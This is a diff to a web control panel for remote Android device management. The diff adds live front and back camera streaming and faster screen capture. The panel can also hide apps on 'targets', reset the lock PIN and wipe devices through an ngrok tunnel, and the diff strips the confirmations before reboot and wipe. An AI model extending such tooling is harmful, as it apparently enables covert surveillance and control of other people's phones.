@@ -201,7 +201,6 @@
         .flex-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }
         .flex-row input { flex: 1; }
 
-        /* --- App List Specific Styles --- */
         .app-list-area {
             max-height: 200px;
             overflow-y: auto;
@@ -257,10 +256,26 @@
                 <div class="card">
                     <h2>Live View</h2>
                     <div class="btn-toggle">
-                        <button class="action" style="flex:1" onclick="sendCommand('start_screen_capture')">Start Stream</button>
-                        <button style="flex:1" onclick="sendCommand('stop_screen_capture')">Stop</button>
+                        <button class="action" style="flex:1" onclick="sendCommand('start_screen_capture')">Screen Start</button>
+                        <button style="flex:1" onclick="sendCommand('stop_screen_capture')">Screen Stop</button>
                     </div>
                     <img id="liveScreen" class="live-screen" src="" alt="Stream Offline" />
+                </div>
+
+                <!-- Live Camera Control -->
+                <div class="card">
+                    <h2>Live Camera Control</h2>
+                    <label>Select Camera</label>
+                    <select id="cameraIdSelect" style="margin-bottom:10px; margin-top:5px">
+                        <option value="0">Back Camera (0)</option>
+                        <option value="1">Front Camera (1)</option>
+                        <option value="2">Other (2)</option>
+                    </select>
+                    <div class="btn-toggle">
+                        <button class="action" style="flex:1" onclick="sendCommand('live_camera', {enabled: true, cameraId: document.getElementById('cameraIdSelect').value})">Start Camera</button>
+                        <button style="flex:1" onclick="sendCommand('live_camera', {enabled: false})">Stop Camera</button>
+                    </div>
+                    <p style="font-size: 0.7rem; color: var(--text-dim); margin-top: 10px;">Camera stream will replace Screen view above.</p>
                 </div>
 
                 <!-- Immediate Actions -->
@@ -286,10 +301,7 @@
                         <input type="text" id="targetPackage" placeholder="com.package.name">
                         <button onclick="sendCommand('list_apps')">List</button>
                     </div>
-
-                    <!-- Scrollable App List -->
                     <div id="appListArea" class="app-list-area"></div>
-
                     <div class="btn-toggle" style="margin-bottom: 8px; margin-top: 10px;">
                         <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: true})">Hide</button>
                         <button style="flex:1" onclick="sendCommand('hide_app', {packageName: document.getElementById('targetPackage').value, hidden: false})">Unhide</button>
@@ -404,7 +416,7 @@
                     <hr>
                     <label>Reset Screen Lock (PIN)</label>
                     <div class="flex-row" style="margin-top:5px;">
-                        <input type="text" id="newPin" placeholder="Enter 4-6 digit PIN" value="0000">
+                        <input type="text" id="newPin" placeholder="Enter PIN" value="0000">
                         <button class="action" onclick="sendCommand('reset_password', {password: document.getElementById('newPin').value})">Set PIN</button>
                     </div>
                 </div>
@@ -511,18 +523,15 @@
                 const select = document.getElementById('deviceSelect');
                 const res = await fetch('/get-all-devices?t=' + Date.now(), { headers: NGROK_HEADERS });
                 if (!res.ok) throw new Error('Server returned ' + res.status);
-
                 const devices = await res.json();
                 const currentVal = select.value;
                 const ids = Object.keys(devices);
-
                 select.innerHTML = '<option value="">-- Select Target --</option>';
                 if (ids.length === 0) {
                     select.innerHTML = '<option value="">-- No Active Targets --</option>';
                     document.getElementById('activeDeviceInfo').style.display = 'none';
                     return;
                 }
-
                 ids.forEach(id => {
                     const opt = document.createElement('option');
                     opt.value = id;
@@ -530,7 +539,6 @@
                     opt.innerText = `${devices[id].model || 'Unknown'} (${id.substring(0,6)}...) [${lastSeen}]`;
                     select.appendChild(opt);
                 });
-
                 if (currentVal && devices[currentVal]) select.value = currentVal;
                 else if (ids.length === 1 && !currentVal) {
                     select.value = ids[0];
@@ -545,12 +553,9 @@
         function renderAppsList(apps) {
             const listEl = document.getElementById('appListArea');
             if (!apps || !Array.isArray(apps)) return;
-
             listEl.style.display = 'block';
             listEl.innerHTML = '';
-
             apps.sort((a, b) => a.name.localeCompare(b.name));
-
             apps.forEach(app => {
                 const div = document.createElement('div');
                 div.className = 'app-item';
@@ -559,13 +564,7 @@
                     div.style.background = 'rgba(56, 189, 248, 0.2)';
                     setTimeout(() => div.style.background = '', 200);
                 };
-
-                const type = app.isSystem ? 'System' : 'Third-party';
-                div.innerHTML = `
-                    <div class="app-name-text">${app.name}</div>
-                    <div class="app-pkg-text">${app.package}</div>
-                    <div class="app-type-tag">${type}</div>
-                `;
+                div.innerHTML = `<div class="app-name-text">${app.name}</div><div class="app-pkg-text">${app.package}</div><div class="app-type-tag">${app.isSystem?'System':'User'}</div>`;
                 listEl.appendChild(div);
             });
         }
@@ -573,32 +572,22 @@
         async function fetchDeviceData() {
             const deviceId = document.getElementById('deviceSelect').value;
             if (!deviceId) return;
-
             const isCoolingDown = (Date.now() - lastCommandTimestamp < SYNC_COOLDOWN);
-
             document.getElementById('controls').style.display = 'block';
             document.getElementById('activeDeviceInfo').style.display = 'block';
             document.getElementById('displayDeviceId').innerText = deviceId;
-
             try {
                 const res = await fetch(`/get-device-data?deviceId=${deviceId}&t=${Date.now()}`, { headers: NGROK_HEADERS });
                 if (!res.ok) throw new Error('Fetch error');
-
                 const data = await res.json();
                 if (data.status && data.status.deviceId) {
                     document.getElementById('connectionStatus').className = 'status-dot status-online';
-
                     const newLog = JSON.stringify(data, null, 2);
                     if (document.getElementById('logs').innerText !== newLog) {
                         document.getElementById('logs').innerText = newLog;
                         document.getElementById('lastUpdated').innerText = "Updated: " + new Date().toLocaleTimeString();
-
-                        // Update app list if present
-                        if (data.response && data.response.apps) {
-                            renderAppsList(data.response.apps);
-                        }
+                        if (data.response && data.response.apps) renderAppsList(data.response.apps);
                     }
-
                     if (!isCoolingDown) {
                         const s = data.status;
                         updateButton('btn_camera_allow', 'btn_camera_block', s.cameraDisabled);
@@ -617,73 +606,29 @@
                     }
                     hideError();
                 }
-            } catch (e) {
-                document.getElementById('connectionStatus').className = 'status-dot status-offline';
-            }
+            } catch (e) { document.getElementById('connectionStatus').className = 'status-dot status-offline'; }
         }
 
         async function sendCommand(action, params = {}) {
             const deviceId = document.getElementById('deviceSelect').value;
-            if (!deviceId) return alert("Select a device!");
-
+            if (!deviceId) return alert("Select device");
             if (action === 'list_apps') {
                 document.getElementById('appListArea').style.display = 'block';
-                document.getElementById('appListArea').innerHTML = '<div style="padding:10px; text-align:center; color:var(--accent);">Fetching...</div>';
+                document.getElementById('appListArea').innerHTML = '<div style="padding:10px; color:var(--accent);">Fetching...</div>';
             }
-
             lastCommandTimestamp = Date.now();
-            try {
-                if (action === 'camera') updateButton('btn_camera_allow', 'btn_camera_block', params.disabled);
-                if (action === 'flashlight') updateToggle('btn_flashlight_on', 'btn_flashlight_off', params.enabled);
-                if (action === 'location_disable') updateButton('btn_location_allow', 'btn_location_block', params.disabled);
-                if (action === 'wifi_disable') updateButton('btn_wifi_allow', 'btn_wifi_block', params.disabled);
-                if (action === 'bluetooth_disable') updateButton('btn_bluetooth_allow', 'btn_bluetooth_block', params.disabled);
-                if (action === 'google_services') updateButton('btn_google_allow', 'btn_google_block', params.block);
-                if (action === 'account_management_disable') updateButton('btn_accounts_allow', 'btn_accounts_block', params.disabled);
-                if (action === 'factory_reset_block') updateButton('btn_factory_allow', 'btn_factory_block', params.block);
-                if (action === 'status_bar_disable') updateButton('btn_statusbar_allow', 'btn_statusbar_block', params.disabled);
-                if (action === 'keyguard_disable') updateButton('btn_keyguard_allow', 'btn_keyguard_block', params.disabled);
-                if (action === 'kiosk_mode') updateToggle('btn_kiosk_on', 'btn_kiosk_off', params.enabled);
-                if (action === 'stay_on') updateToggle('btn_stayon_on', 'btn_stayon_off', params.enabled);
-            } catch(e) {}
-
             try {
                 const res = await fetch('/send-command', {
                     method: 'POST',
                     headers: { ...NGROK_HEADERS, 'Content-Type': 'application/json' },
                     body: JSON.stringify({ deviceId, action, params })
                 });
-                if (!res.ok) {
-                    const err = await res.json();
-                    throw new Error(err.error || res.status);
-                }
-            } catch (e) {
-                showError("Cmd Error: " + e.message);
-                lastCommandTimestamp = 0;
-                fetchDeviceData();
-            }
+                if (!res.ok) { const err = await res.json(); throw new Error(err.error || res.status); }
+            } catch (e) { showError("Error: " + e.message); lastCommandTimestamp = 0; fetchDeviceData(); }
         }
 
-        function safeReboot() {
-            if (confirm("Step 1/2: Are you sure you want to REBOOT the device?")) {
-                if (confirm("Step 2/2: Device will temporarily go offline. Proceed?")) {
-                    sendCommand('reboot');
-                }
-            }
-        }
-
-        function safeWipe() {
-            if (confirm("Step 1/3: CRITICAL WARNING! This will FACTORY RESET the device.")) {
-                if (confirm("Step 2/3: ALL DATA WILL BE DELETED PERMANENTLY. No recovery possible. Continue?")) {
-                    const confirmation = prompt("Step 3/3: To prevent accidental wipe, type 'PERMANENT WIPE' below:");
-                    if (confirmation === "PERMANENT WIPE") {
-                        sendCommand('wipe');
-                    } else {
-                        alert("Wipe cancelled. Confirmation text did not match.");
-                    }
-                }
-            }
-        }
+        function safeReboot() { if (confirm("Reboot?")) sendCommand('reboot'); }
+        function safeWipe() { if (confirm("WIPE?") && prompt("Type 'PERMANENT WIPE'") === "PERMANENT WIPE") sendCommand('wipe'); }
 
         function updateButton(idAllow, idBlock, isDisabled) {
             const a = document.getElementById(idAllow), b = document.getElementById(idBlock);
@@ -714,18 +659,13 @@
                         currentBlobUrl = URL.createObjectURL(blob);
                         document.getElementById('liveScreen').src = currentBlobUrl;
                     }
-                } catch (e) {
-                    console.error("Frame fetch error:", e);
-                } finally {
-                    isFetchingFrame = false;
-                }
+                } catch (e) {} finally { isFetchingFrame = false; }
             }
         }
 
         setInterval(loadDevices, 10000);
         setInterval(fetchDeviceData, 4000);
-        setInterval(updateLiveStream, 800);
-
+        setInterval(updateLiveStream, 500);
         loadDevices();
     </script>
 </body>
